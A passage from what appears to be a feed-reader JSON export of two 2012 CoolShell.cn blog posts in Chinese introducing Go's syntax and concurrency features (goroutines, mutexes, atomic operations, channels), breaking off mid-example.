    "title" : "Go 语言简介（上）— 语法",
    "published" : 1352161668,
    "updated" : 1352161668,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/8460.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>周末天气不好，只能宅在家里，于是就顺便看了一下Go语言，觉得比较有意思，所以写篇文章介绍一下。<strong>我想写一篇你可以在乘坐地铁或公交车上下班时就可以初步了解一门语言的文章</strong>。所以，下面的文章主要是以代码和注释为主。只需要你对C语言，Unix，Python有一点基础，我相信你会在30分钟左右读完并对Go语言有一些初步了解的。</p>\n<p><img title=\"go\" src=\"http://coolshell.cn//wp-content/uploads/2012/11/go2.jpg\" alt=\"\" width=\"435\" height=\"255\"></p>\n<h4>Hello World</h4>\n<pre>package main //声明本文件的package名\n\nimport &quot;fmt&quot; //import语言的fmt库——用于输出\n\nfunc main() {\n    fmt.Println(&quot;hello world&quot;)\n}</pre>\n<p><span></span></p>\n<h4>运行</h4>\n<p>你可以有两种运行方式，</p>\n<pre>$go run hello.go\nhello world</pre>\n<pre>$go build hello.go\n\n$ls\nhello hello.go\n\n$./hello\nhello world</pre>\n<h4>自己的package</h4>\n<p>你可以使用GOPATH环境变量，或是使用相对路径来import你自己的package。</p>\n<p>Go的规约是这样的：</p>\n<p style=\"padding-left:30px\">1）<strong>在import中，你可以使用相对路径，如 ./或 ../ 来引用你的package</strong></p>\n<p style=\"padding-left:30px\">2）<strong>如果没有使用相对路径，那么，go会去找$GOPATH/src/目录。</strong></p>\n<pre>\n\nimport &quot;./haoel&quot;  //import当前目录里haoel子目录里的所有的go文件\n\n</pre>\n<pre>\n\nimport &quot;haoel&quot;  //import 环境变量 $GOPATH/src/haoel子目录里的所有的go文件\n\n</pre>\n<h4>fmt输出格式</h4>\n<p>fmt包和libc里的那堆使用printf， scanf，fprintf，fscanf 很相似。下面的东西对于C程序员不会陌生。</p>\n<p>注意：Println不支持，Printf才支持%式的输出：</p>\n<pre>package main\n\nimport &quot;fmt&quot;\nimport &quot;math&quot;\n\nfunc main() {\n    fmt.Println(&quot;hello world&quot;)\n\n    fmt.Printf(&quot;%t\\n&quot;, 1==2)\n    fmt.Printf(&quot;二进制：%b\\n&quot;, 255)\n    fmt.Printf(&quot;八进制：%o\\n&quot;, 255)\n    fmt.Printf(&quot;十六进制：%X\\n&quot;, 255)\n    fmt.Printf(&quot;十进制：%d\\n&quot;, 255)\n    fmt.Printf(&quot;浮点数：%f\\n&quot;, math.Pi)\n    fmt.Printf(&quot;字符串：%s\\n&quot;, &quot;hello world&quot;)\n}</pre>\n<p>当然，也可以使用如\\n\\t\\r这样的和C语言一样的控制字符</p>\n<h4>变量和常量</h4>\n<p>变量的声明很像 javascript，使用 var关键字。注意：<strong>go是静态类型的语言</strong>，下面是代码：</p>\n<pre>\n//声明初始化一个变量\nvar  x int = 100\nvar str string = &quot;hello world&quot;&lt;/pre&gt;\n//声明初始化多个变量\nvar  i, j, k int = 1, 2, 3\n\n//不用指明类型，通过初始化值来推导\nvar b = true //bool型\n</pre>\n<p>还有一种定义变量的方式（这让我想到了Pascal语言，但完全不一样）</p>\n<pre>\n\nx := 100 //等价于 var x int = 100;\n\n</pre>\n<p>常量很简单，使用const关键字：</p>\n<pre>\nconst s string = &quot;hello world&quot;\nconst pi float32 = 3.1415926\n</pre>\n<h4>数组</h4>\n<p>直接看代码（注意其中的for语句，和C很相似吧，就是没有括号了）</p>\n<pre>\n\nfunc main() {\n    var a [5]int\n    fmt.Println(&quot;array a:&quot;, a)\n\n    a[1] = 10\n    a[3] = 30\n    fmt.Println(&quot;assign:&quot;, a)\n\n    fmt.Println(&quot;len:&quot;, len(a))\n\n    b := [5]int{1, 2, 3, 4, 5}\n    fmt.Println(&quot;init:&quot;, b)\n\n    var c [2][3]int\n    for i := 0; i &lt; 2; i++ {\n        for j := 0; j &lt; 3; j++ {\n            c[i][j] = i + j\n        }\n    }\n    fmt.Println(&quot;2d: &quot;, c)\n}\n\n</pre>\n<p>运行结果：</p>\n<pre>\n\narray a: [0 0 0 0 0]\nassign: [0 10 0 30 0]\nlen: 5\ninit: [1 2 3 4 5]\n2d:  [[0 1 2] [1 2 3]]\n\n</pre>\n<h4>数组的切片操作</h4>\n<p>这个很Python了。</p>\n<pre>\n\na := [5]int{1, 2, 3, 4, 5}\n\nb := a[2:4] // a[2] 和 a[3]，但不包括a[4]\nfmt.Println(b)\n\nb = a[:4] // 从 a[0]到a[4]，但不包括a[4]\nfmt.Println(b)\n\nb = a[2:] // 从 a[2]到a[4]，且包括a[2]\nfmt.Println(b)\n\n</pre>\n<h4>分支循环语句</h4>\n<p><strong>if语句</strong></p>\n<p>注意：if 语句没有圆括号，而必需要有花括号</p>\n<pre>\n//if 语句\nif x % 2 == 0 {\n    //...\n}\n//if - else\nif x % 2 == 0 {\n    //偶数...\n} else {\n    //奇数...\n}\n\n//多分支\nif num &lt; 0 {\n    //负数\n} else if num == 0 {\n    //零\n} else {\n    //正数\n}\n</pre>\n<p><strong>switch 语句</strong></p>\n<p>注意：switch语句没有break，还可以使用逗号case多个值</p>\n<pre>\nswitch i {\n    case 1:\n        fmt.Println(&quot;one&quot;)\n    case 2:\n        fmt.Println(&quot;two&quot;)\n    case 3:\n        fmt.Println(&quot;three&quot;)\n    case 4,5,6:\n        fmt.Println(&quot;four, five, six&quot;)\n    default:\n        fmt.Println(&quot;invalid value!&quot;)\n}\n</pre>\n<p><strong>for 语句</strong></p>\n<p>前面你已见过了，下面再来看看for的三种形式：（注意：Go语言中没有while）</p>\n<pre>\n//经典的for语句 init; condition; post\nfor i := 0; i&lt;10; i++{\n     fmt.Println(i)\n}\n\n//精简的for语句 condition\ni := 1\nfor i&lt;10 {\n    fmt.Println(i)\n    i++\n}\n\n//死循环的for语句 相当于for(;;)\ni :=1\nfor {\n    if i&gt;10 {\n        break\n    }\n    i++\n}\n</pre>\n<h4>关于分号</h4>\n<p>从上面的代码我们可以看到代码里没有分号。其实，<strong>和C一样，Go的正式的语法使用分号来终止语句。和C不同的是，这些分号由词法分析器在扫描源代码过程中使用简单的规则自动插入分号，因此输入源代码多数时候就不需要分号了</strong>。</p>\n<p>规则是这样的：如果在一个新行前方的最后一个标记是一个标识符（包括像<code>int</code>和<code>float64</code>这样的单词）、一个基本的如数值这样的文字、或以下标记中的一个时，会自动插入分号：</p>\n<pre>break continue fallthrough return ++ -- ) }</pre>\n<p>通常Go程序仅在<code>for</code>循环语句中使用分号，以此来分开初始化器、条件和增量单元。如果你在一行中写多个语句，也需要用分号分开。</p>\n<p><strong>注意</strong>：<strong>无论任何时候，你都不应该将一个控制结构（(<code>if</code>、<code>for</code>、<code>switch</code>或<code>select</code>）的左大括号放在下一行。如果这样做，将会在大括号的前方插入一个分号，这可能导致出现不想要的结果</strong>。</p>\n<h4>map</h4>\n<p>map在别的语言里可能叫哈希表或叫dict，下面是和map的相关操作的代码，代码很容易懂</p>\n<pre>\nfunc main(){\n    m := make(map[string]int) //使用make创建一个空的map\n\n    m[&quot;one&quot;] = 1\n    m[&quot;two&quot;] = 2\n    m[&quot;three&quot;] = 3\n\n    fmt.Println(m) //输出 map[three:3 two:2 one:1] (顺序在运行时可能不一样)\n    fmt.Println(len(m)) //输出 3\n\n    v := m[&quot;two&quot;] //从map里取值\n    fmt.Println(v) // 输出 2\n\n    delete(m, &quot;two&quot;)\n    fmt.Println(m) //输出 map[three:3 one:1]\n\n    m1 := map[string]int{&quot;one&quot;: 1, &quot;two&quot;: 2, &quot;three&quot;: 3}\n    fmt.Println(m1) //输出 map[two:2 three:3 one:1] (顺序在运行时可能不一样)\n\n    for key, val := range m1{\n        fmt.Printf(&quot;%s =&gt; %d \\n&quot;, key, val)\n        /*输出：(顺序在运行时可能不一样)\n            three =&gt; 3\n            one =&gt; 1\n            two =&gt; 2*/\n    }\n}\n</pre>\n<h4>指针</h4>\n<p>Go语言一样有指针，看代码</p>\n<pre>\n\nvar i int = 1\nvar pInt *int = &amp;i\n//输出：i=1     pInt=0xf8400371b0       *pInt=1\nfmt.Printf(&quot;i=%d\\tpInt=%p\\t*pInt=%d\\n&quot;, i, pInt, *pInt)\n\n*pInt = 2\n//输出：i=2     pInt=0xf8400371b0       *pInt=2\nfmt.Printf(&quot;i=%d\\tpInt=%p\\t*pInt=%d\\n&quot;, i, pInt, *pInt)\n\ni = 3\n//输出：i=3     pInt=0xf8400371b0       *pInt=3\nfmt.Printf(&quot;i=%d\\tpInt=%p\\t*pInt=%d\\n&quot;, i, pInt, *pInt)\n\n</pre>\n<p>Go具有两个分配内存的机制，分别是内建的函数new和make。他们所做的事不同，所应用到的类型也不同，这可能引起混淆，但规则却很简单。</p>\n<h4><strong>内存分配 </strong></h4>\n<p><strong>new</strong> 是一个分配内存的内建函数，但不同于其他语言中同名的new所作的工作，<strong>它只是将内存清零，而不是初始化内存</strong>。new(T)为一个类型为T的新项目分配了值为零的存储空间并返回其地址，也就是一个类型为*T的值。用Go的术语来说，就是<strong>它返回了一个指向新分配的类型为T的零值的指针</strong>。</p>\n<p><code><strong>make</strong>(T, </code><em>args</em><code>)</code>函数的目的与<code>new(T)</code>不同。它仅用于创建切片、map和chan（消息管道），并返回类型<code>T</code>（不是<code>*T</code>）的一个<strong>被初始化了的</strong>（不是<strong>零</strong>）实例。这种差别的出现是由于这三种类型实质上是对在使用前必须进行初始化的数据结构的引用。例如，切片是一个具有三项内容的描述符，包括指向数据（在一个数组内部）的指针、长度以及容量，在这三项内容被初始化之前，切片值为<code>nil</code>。对于切片、映射和信道，<code>make</code>初始化了其内部的数据结构并准备了将要使用的值。如：</p>\n<p>下面的代码分配了一个整型数组，长度为10，容量为100，并返回前10个数组的切片</p>\n<pre>make([]int, 10, 100)</pre>\n<p>以下示例说明了<code>new</code>和<code>make</code>的不同。</p>\n<pre>var p *[]int = new([]int)   // 为切片结构分配内存；*p == nil；很少使用\nvar v  []int = make([]int, 10) // 切片v现在是对一个新的有10个整数的数组的引用\n\n// 不必要地使问题复杂化：\nvar p *[]int = new([]int)\nfmt.Println(p) //输出：&amp;[]\n*p = make([]int, 10, 10)\nfmt.Println(p) //输出：&amp;[0 0 0 0 0 0 0 0 0 0]\nfmt.Println((*p)[2]) //输出： 0\n\n// 习惯用法:\nv := make([]int, 10)\nfmt.Println(v) //输出：[0 0 0 0 0 0 0 0 0 0]\n</pre>\n<h4>函数</h4>\n<p>老实说，我对Go语言这种反过来声明变量类型和函数返回值的做法有点不满（保持和C一样的不可以吗? 呵呵）</p>\n<pre>\npackage main\nimport &quot;fmt&quot;\n\nfunc max(a int, b int) int { //注意参数和返回值是怎么声明的\n\n    if a &gt; b {\n        return a\n    }\n    return b\n}\n\nfunc main(){\n    fmt.Println(max(4, 5))\n}\n\n</pre>\n<p><strong>函数返回多个值</strong></p>\n<p>Go中很多Package 都会返回两个值，一个是正常值，一个是错误，如下所示：</p>\n<pre>\npackage main\nimport &quot;fmt&quot;\n\nfunc main(){\n    v, e := multi_ret(&quot;one&quot;)\n    fmt.Println(v,e) //输出 1 true\n\n    v, e = multi_ret(&quot;four&quot;)\n    fmt.Println(v,e) //输出 0 false\n\n    //通常的用法(注意分号后有e)\n    if v, e = multi_ret(&quot;four&quot;); e {\n    \t// 正常返回\n    }else{\n    \t// 出错返回\n    }\n}\n\nfunc multi_ret(key string) (int, bool){\n    m := map[string]int{&quot;one&quot;: 1, &quot;two&quot;: 2, &quot;three&quot;: 3}\n\n    var err bool\n    var val int\n\n    val, err = m[key]\n\n    return val, err\n}\n</pre>\n<p><strong>函数不定参数</strong></p>\n<p>例子很清楚了，我就不多说了</p>\n<pre>\nfunc sum(nums ...int) {\n    fmt.Print(nums, &quot; &quot;)  //输出如 [1, 2, 3] 之类的数组\n    total := 0\n    for _, num := range nums { //要的是值而不是下标\n        total += num\n    }\n    fmt.Println(total)\n}\nfunc main() {\n    sum(1, 2)\n    sum(1, 2, 3)\n\n    //传数组\n    nums := []int{1, 2, 3, 4}\n    sum(nums...)\n}</pre>\n<p><strong>函数闭包</strong></p>\n<p>nextNum这个函数返回了一个匿名函数，这个匿名函数记住了nextNum中i+j的值，并改变了i,j的值，于是形成了一个闭包的用法</p>\n<pre>func nextNum() func() int {\n    i,j := 1,1\n    return func() int {\n        var tmp = i+j\n        i, j = j, tmp\n        return tmp\n    }\n}\n//main函数中是对nextNum的调用，其主要是打出下一个斐波拉契数\nfunc main(){\n    nextNumFunc := nextNum()\n    for i:=0; i&lt;10; i++ {\n    \tfmt.Println(nextNumFunc())\n    }\n}\n</pre>\n<p><strong>函数的递归</strong></p>\n<p>和c基本是一样的</p>\n<pre>\nfunc fact(n int) int {\n    if n == 0 {\n        return 1\n    }\n    return n * fact(n-1)\n}\n\nfunc main() {\n    fmt.Println(fact(7))\n}</pre>\n<h4>结构体</h4>\n<p>Go的结构体和C的基本上一样，不过在初始化时有些不一样，Go支持带名字的初始化。</p>\n<pre>\ntype Person struct {\n    name string\n    age  int\n    email string\n}\n\nfunc main() {\n    //初始化\n    person := Person{&quot;Tom&quot;, 30, &quot;tom@gmail.com&quot;}\n    person = Person{name:&quot;Tom&quot;, age: 30, email:&quot;tom@gmail.com&quot;}\n\n    fmt.Println(person) //输出 {Tom 30 tom@gmail.com}\n\n    pPerson := &amp;person\n\n    fmt.Println(pPerson) //输出 &amp;{Tom 30 tom@gmail.com}\n\n    pPerson.age = 40\n    person.name = &quot;Jerry&quot;\n    fmt.Println(person) //输出 {Jerry 40 tom@gmail.com}\n}\n</pre>\n<h4>结构体方法</h4>\n<p>不多说了，看代码吧。</p>\n<p>注意：Go语言中没有public, protected, private的关键字，所以，<strong>如果你想让一个方法可以被别的包访问的话，你需要把这个方法的第一个字母大写。这是一种约定</strong>。</p>\n<pre>\ntype rect struct {\n    width, height int\n}\n\nfunc (r *rect) area() int { //求面积\n    return r.width * r.height\n}\n\nfunc (r *rect) perimeter() int{ //求周长\n    return 2*(r.width + r.height)\n}\n\nfunc main() {\n    r := rect{width: 10, height: 15}\n\n    fmt.Println(&quot;面积: &quot;, r.area())\n    fmt.Println(&quot;周长: &quot;, r.perimeter())\n\n    rp := &amp;r\n    fmt.Println(&quot;面积: &quot;, rp.area())\n    fmt.Println(&quot;周长: &quot;, rp.perimeter())\n}\n</pre>\n<h4>接口和多态</h4>\n<p>接口意味着多态，下面是一个经典的例子，不用多说了，自己看代码吧。</p>\n<pre>\n//---------- 接 口 --------//\ntype shape interface {\n\tarea() float64 //计算面积\n\tperimeter() float64 //计算周长\n}\n\n//--------- 长方形 ----------//\ntype rect struct {\n    width, height float64\n}\n\nfunc (r *rect) area() float64 { //面积\n\treturn r.width * r.height\n}\n\nfunc (r *rect) perimeter() float64 { //周长\n\treturn 2*(r.width + r.height)\n}\n\n//----------- 圆  形 ----------//\ntype circle struct {\n\tradius float64\n}\n\nfunc (c *circle) area() float64 { //面积\n\treturn math.Pi * c.radius * c.radius\n}\n\nfunc (c *circle) perimeter() float64 { //周长\n\treturn 2 * math.Pi * c.radius\n}\n\n// ----------- 接口的使用 -----------//\nfunc interface_test() {\n    r := rect {width:2.9, height:4.8}\n    c := circle {radius:4.3}\n\n    s := []shape{&amp;r, &amp;c} //通过指针实现\n\n    for _, sh := range s {\n        fmt.Println(sh)\n    \tfmt.Println(sh.area())\n    \tfmt.Println(sh.perimeter())\n    }\n}\n</pre>\n<h4>错误处理 – Error接口</h4>\n<p>函数错误返回可能是C/C++时最让人纠结的东西的，Go的多值返回可以让我们更容易的返回错误，其可以在返回一个常规的返回值之外，还能轻易地返回一个详细的错误描述。通常情况下，错误的类型是error，它有一个内建的接口。</p>\n<pre>type error interface {\n    Error() string\n}</pre>\n<p>还是看个示例吧：</p>\n<pre>package main\n\nimport &quot;fmt&quot;\nimport &quot;errors&quot;\n\n//自定义的出错结构\ntype myError struct {\n    arg  int\n    errMsg string\n}\n//实现Error接口\nfunc (e *myError) Error() string {\n    return fmt.Sprintf(&quot;%d - %s&quot;, e.arg, e.errMsg)\n}\n\n//两种出错\nfunc error_test(arg int) (int, error) {\n    if arg &lt; 0  {\n         return -1, errors.New(&quot;Bad Arguments - negtive!&quot;)\n     }else if arg &gt;256 {\n        return -1, &amp;myError{arg, &quot;Bad Arguments - too large!&quot;}\n    }\n    return arg*arg, nil\n}\n\n//相关的测试\nfunc main() {\n    for _, i := range []int{-1, 4, 1000} {\n        if r, e := error_test(i); e != nil {\n            fmt.Println(&quot;failed:&quot;, e)\n        } else {\n            fmt.Println(&quot;success:&quot;, r)\n        }\n    }\n}</pre>\n<p>程序运行后输出：</p>\n<pre>\nfailed: Bad Arguments - negtive!\nsuccess: 16\nfailed: 1000 - Bad Arguments - too large!\n</pre>\n<h4>错误处理 – Defer</h4>\n<p>下面的程序对于每一个熟悉C语言的人来说都不陌生（有资源泄露的问题），C++使用RAII来解决这种问题。</p>\n<pre>func CopyFile(dstName, srcName string) (written int64, err error) {\n    src, err := os.Open(srcName)\n    if err != nil {\n        return\n    }\n\n    dst, err := os.Create(dstName)\n    if err != nil {\n        return\n    }\n\n    written, err = io.Copy(dst, src)\n    dst.Close()\n    src.Close()\n    return\n}</pre>\n<p>Go语言引入了Defer来确保那些被打开的文件能被关闭。如下所示：（这种解决方式还是比较优雅的）</p>\n<pre>func CopyFile(dstName, srcName string) (written int64, err error) {\n    src, err := os.Open(srcName)\n    if err != nil {\n        return\n    }\n    defer src.Close()\n\n    dst, err := os.Create(dstName)\n    if err != nil {\n        return\n    }\n    defer dst.Close()\n\n    return io.Copy(dst, src)\n}</pre>\n<p>Go的defer语句预设一个函数调用（延期的函数），该调用在函数执行defer返回时立刻运行。该方法显得不同常规，但却是处理上述情况很有效，无论函数怎样返回，都必须进行资源释放。</p>\n<p>我们再来看一个defer函数的示例：</p>\n<pre>for i := 0; i &lt; 5; i++ {\n    defer fmt.Printf(&quot;%d &quot;, i)\n}</pre>\n<p>被延期的函数以后进先出（LIFO）的顺行执行，因此以上代码在返回时将打印4 3 2 1 0。</p>\n<p>总之，我个人觉得defer的函数行为有点怪异，我现在还没有完全搞清楚。</p>\n<h4>错误处理 – Panic/Recover</h4>\n<p>对于不可恢复的错误，Go提供了一个内建的panic函数，它将创建一个运行时错误并使程序停止（相当暴力）。该函数接收一个任意类型（往往是字符串）作为程序死亡时要打印的东西。当编译器在函数的结尾处检查到一个panic时，就会停止进行常规的return语句检查。</p>\n<p>下面的仅仅是一个示例。实际的库函数应避免panic。如果问题可以容忍，最好是让事情继续下去而不是终止整个程序。</p>\n<pre>var user = os.Getenv(&quot;USER&quot;)\n\nfunc init() {\n    if user == &quot;&quot; {\n        panic(&quot;no value for $USER&quot;)\n    }\n}</pre>\n<p>当panic被调用时，它将立即停止当前函数的执行并开始逐级解开函数堆栈，同时运行所有被defer的函数。如果这种解开达到堆栈的顶端，程序就死亡了。但是，也可以使用内建的recover函数来重新获得Go程的控制权并恢复正常的执行。 对recover的调用会通知解开堆栈并返回传递到panic的参量。由于仅在解开期间运行的代码处在被defer的函数之内，recover仅在被延期的函数内部才是有用的。</p>\n<p>你可以简单地理解为recover就是用来捕捉Painc的，防止程序一下子就挂掉了。</p>\n<p>下面是一个例程，很简单了，不解释了</p>\n<pre>func g(i int) {\n    if i&gt;1 {\n        fmt.Println(&quot;Panic!&quot;)\n        panic(fmt.Sprintf(&quot;%v&quot;, i))\n    }\n\n}\n\nfunc f() {\n    defer func() {\n        if r := recover(); r != nil {\n            fmt.Println(&quot;Recovered in f&quot;, r)\n        }\n    }()\n\n    for i := 0; i &lt; 4; i++ {\n        fmt.Println(&quot;Calling g with &quot;, i)\n        g(i)\n        fmt.Println(&quot;Returned normally from g.&quot;)\n     }\n}\n\nfunc main() {\n    f()\n    fmt.Println(&quot;Returned normally from f.&quot;)\n}</pre>\n<p>运行结果如下：（我们可以看到Painc后的for循环就没有往下执行了，但是main的程序还在往下走）</p>\n<pre>Calling g with  0\nReturned normally from g.\nCalling g with  1\nReturned normally from g.\nCalling g with  2\nPanic!\nRecovered in f 2\nReturned normally from f.\n</pre>\n<p>你习惯这种编程方式吗？我觉得有点诡异。呵呵。</p>\n<p>好了，上面是是一Go语言相关的编程语法的介绍，我没有事无巨细，只是让你了解一下Go语言是长什么样的。<strong>当然，这还没完，请期待下篇——Go语言的特性</strong>。\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2012年11月07日 -- <a href=\"http://coolshell.cn/articles/8489.html\">Go 语言简介（下）— 特性</a></li><li>2012年07月05日 -- <a href=\"http://coolshell.cn/articles/7771.html\">少即是极多</a></li><li>2010年09月28日 -- <a href=\"http://coolshell.cn/articles/3013.html\">一些非常有意思的杂项资源</a></li><li>2012年05月24日 -- <a href=\"http://coolshell.cn/articles/7480.html\">Javascript 中的 var</a></li><li>2009年11月13日 -- <a href=\"http://coolshell.cn/articles/1781.html\">Go语言更名Issue 9？</a></li><li>2009年11月16日 -- <a href=\"http://coolshell.cn/articles/1788.html\">程序语言性能比拼</a></li><li>2009年11月11日 -- <a href=\"http://coolshell.cn/articles/1751.html\">Go 语言：Google 的新编程语言</a></li><li>2010年10月12日 -- <a href=\"http://coolshell.cn/articles/3156.html\">Go语言的”Issue 9″ Closed!</a></li></ul><div><a rel=\"nofollow\" href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1354084114958",
    "timestampUsec" : "1354084114958652",
    "id" : "tag:google.com,2005:reader/item/921932db36cd2b16",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "程序设计", "编程语言", "Go", "golang" ],
    "title" : "Go 语言简介（下）— 特性",
    "published" : 1352247440,
    "updated" : 1352247440,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/8489.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>希望你看到这篇文章的时候还是在公交车和地铁上正在上下班的时间，我希望我的这篇文章可以让你利用这段时间了解一门语言。当然，希望你不会因为看我的文章而错过站。呵呵。</p>\n<p>如果你还不了解Go语言的语法，还请你移步先看一下上篇——《<strong><a title=\"Go语言简介（上）：语法\" href=\"http://coolshell.cn/articles/8460.html\">Go语言简介（上）：语法</a></strong>》</p>\n<p><img src=\"http://coolshell.cn//wp-content/uploads/2012/11/google-go-language.jpg\" alt=\"\" title=\"google-go-language\" width=\"450\" height=\"272\"></p>\n<h4>goroutine</h4>\n<p>GoRoutine主要是使用go关键字来调用函数，你还可以使用匿名函数，如下所示：</p>\n<p><span></span></p>\n<pre>package main\nimport &quot;fmt&quot;\n\nfunc f(msg string) {\n    fmt.Println(msg)\n}\n\nfunc main(){\n    go f(&quot;goroutine&quot;)\n\n    go func(msg string) {\n        fmt.Println(msg)\n    }(&quot;going&quot;)\n}</pre>\n<p>我们再来看一个示例，下面的代码中包括很多内容，包括时间处理，随机数处理，还有goroutine的代码。如果你熟悉C语言，你应该会很容易理解下面的代码。</p>\n<p>你可以简单的把go关键字调用的函数想像成pthread_create。下面的代码使用for循环创建了3个线程，每个线程使用一个随机的Sleep时间，然后在routine()函数中会输出一些线程执行的时间信息。</p>\n<pre>\npackage main\n\nimport &quot;fmt&quot;\nimport &quot;time&quot;\nimport &quot;math/rand&quot;\n\nfunc routine(name string, delay time.Duration) {\n\n    t0 := time.Now()\n    fmt.Println(name, &quot; start at &quot;, t0)\n\n    time.Sleep(delay)\n\n    t1 := time.Now()\n    fmt.Println(name, &quot; end at &quot;, t1)\n\n    fmt.Println(name, &quot; lasted &quot;, t1.Sub(t0))\n}\n\nfunc main() {\n\n    //生成随机种子\n    rand.Seed(time.Now().Unix())\n\n    var name string\n    for i:=0; i&lt;3; i++{\n        name = fmt.Sprintf(&quot;go_%02d&quot;, i) //生成ID\n        //生成随机等待时间，从0-4秒\n        go routine(name, time.Duration(rand.Intn(5)) * time.Second)\n    }\n\n    //让主进程停住，不然主进程退了，goroutine也就退了\n    var input string\n    fmt.Scanln(&amp;input)\n    fmt.Println(&quot;done&quot;)\n}\n</pre>\n<p>运行的结果可能是：</p>\n<pre>\ngo_00  start at  2012-11-04 19:46:35.8974894 +0800 +0800\ngo_01  start at  2012-11-04 19:46:35.8974894 +0800 +0800\ngo_02  start at  2012-11-04 19:46:35.8974894 +0800 +0800\ngo_01  end at  2012-11-04 19:46:36.8975894 +0800 +0800\ngo_01  lasted  1.0001s\ngo_02  end at  2012-11-04 19:46:38.8987895 +0800 +0800\ngo_02  lasted  3.0013001s\ngo_00  end at  2012-11-04 19:46:39.8978894 +0800 +0800\ngo_00  lasted  4.0004s\n</pre>\n<h4>goroutine的并发安全性</h4>\n<p>关于goroutine，我试了一下，无论是Windows还是Linux，基本上来说是用操作系统的线程来实现的。不过，goroutine有个特性，也就是说，<strong>如果一个goroutine没有被阻塞，那么别的goroutine就不会得到执行</strong>。这并不是真正的并发，如果你要真正的并发，你需要在你的main函数的第一行加上下面的这段代码：</p>\n<pre>import &quot;runtime&quot;\n...\nruntime.GOMAXPROCS(4)</pre>\n<p>还是让我们来看一个有并发安全性问题的示例（注意：我使用了C的方式来写这段Go的程序）</p>\n<p>这是一个经常出现在教科书里卖票的例子，我启了5个goroutine来卖票，卖票的函数sell_tickets很简单，就是随机的sleep一下，然后对全局变量total_tickets作减一操作。</p>\n<pre>package main\n\nimport &quot;fmt&quot;\nimport &quot;time&quot;\nimport &quot;math/rand&quot;\nimport &quot;runtime&quot;\n\nvar total_tickets int32 = 10;\n\nfunc sell_tickets(i int){\n    for{\n        if total_tickets &gt; 0 { //如果有票就卖\n            time.Sleep( time.Duration(rand.Intn(5)) * time.Millisecond)\n            total_tickets-- //卖一张票\n            fmt.Println(&quot;id:&quot;, i, &quot;  ticket:&quot;, total_tickets)\n        }else{\n            break\n        }\n    }\n}\n\nfunc main() {\n    runtime.GOMAXPROCS(4) //我的电脑是4核处理器，所以我设置了4\n    rand.Seed(time.Now().Unix()) //生成随机种子\n\n    for i := 0; i &lt; 5; i++ { //并发5个goroutine来卖票\n         go sell_tickets(i)\n    }\n    //等待线程执行完\n    var input string\n    fmt.Scanln(&amp;input)\n    fmt.Println(total_tickets, &quot;done&quot;) //退出时打印还有多少票\n}</pre>\n<p>这个程序毋庸置疑有并发安全性问题，所以执行起来你会看到下面的结果：</p>\n<pre>$go run sell_tickets.go\nid: 0   ticket: 9  \nid: 0   ticket: 8  \nid: 4   ticket: 7  \nid: 1   ticket: 6  \nid: 3   ticket: 5  \nid: 0   ticket: 4  \nid: 3   ticket: 3  \nid: 2   ticket: 2  \nid: 0   ticket: 1  \nid: 3   ticket: 0  \nid: 1   ticket: -1  \nid: 4   ticket: -2  \nid: 2   ticket: -3  \nid: 0   ticket: -4  \n-4 done</pre>\n<p>可见，我们需要使用上锁，我们可以使用互斥量来解决这个问题。下面的代码，我只列出了修改过的内容：</p>\n<pre> package main\nimport &quot;fmt&quot;\nimport &quot;time&quot;\nimport &quot;math/rand&quot;\nimport &quot;sync&quot;\nimport &quot;runtime&quot;\n\nvar total_tickets int32 = 10;\nvar mutex = &amp;sync.Mutex{} //可简写成：var mutex sync.Mutex\n\nfunc sell_tickets(i int){\n    for total_tickets&gt;0 {\n        mutex.Lock()\n        if total_tickets &gt; 0 {\n            time.Sleep( time.Duration(rand.Intn(5)) * time.Millisecond)\n            total_tickets--\n            fmt.Println(i, total_tickets)\n        }\n        mutex.Unlock()\n    }\n}\n.......\n......\n</pre>\n<h4>原子操作</h4>\n<p>说到并发就需要说说原子操作，相信大家还记得我写的那篇《<a title=\"无锁队列的实现\" href=\"http://coolshell.cn/articles/8239.html\">无锁队列的实现</a>》一文，里面说到了一些CAS – CompareAndSwap的操作。Go语言也支持。你可以看一下相当的文档</p>\n<p>我在这里就举一个很简单的示例：下面的程序有10个goroutine，每个会对cnt变量累加20次，所以，最后的cnt应该是200。如果没有atomic的原子操作，那么cnt将有可能得到一个小于200的数。</p>\n<p>下面使用了atomic操作，所以是安全的。</p>\n<pre>package main\n\nimport &quot;fmt&quot;\nimport &quot;time&quot;\nimport &quot;sync/atomic&quot;\n\nfunc main() {\n    var cnt uint32 = 0\n    for i := 0; i &lt; 10; i++ {\n        go func() {\n            for i:=0; i&lt;20; i++ {\n                time.Sleep(time.Millisecond)\n                atomic.AddUint32(&amp;cnt, 1)\n            }\n        }()\n    }\n    time.Sleep(time.Second)//等一秒钟等goroutine完成\n    cntFinal := atomic.LoadUint32(&amp;cnt)//取数据\n    fmt.Println(&quot;cnt:&quot;, cntFinal)\n}</pre>\n<p>这样的函数还有很多，参看<a href=\"http://golang.org/pkg/sync/atomic/\">go的atomic包文档</a>（被墙）</p>\n<h4>Channel 信道</h4>\n<p>Channal是什么？Channal就是用来通信的，就像Unix下的管道一样，在Go中是这样使用Channel的。</p>\n<p>下面的程序演示了一个goroutine和主程序通信的例程。这个程序足够简单了。</p>\n<pre>\npackage main\n\nimport &quot;fmt&quot;\n\nfunc main() {\n    //创建一个string类型的channel\n    channel := make(chan string)\n\n    //创建一个goroutine向channel里发一个字符串\n    go func() { 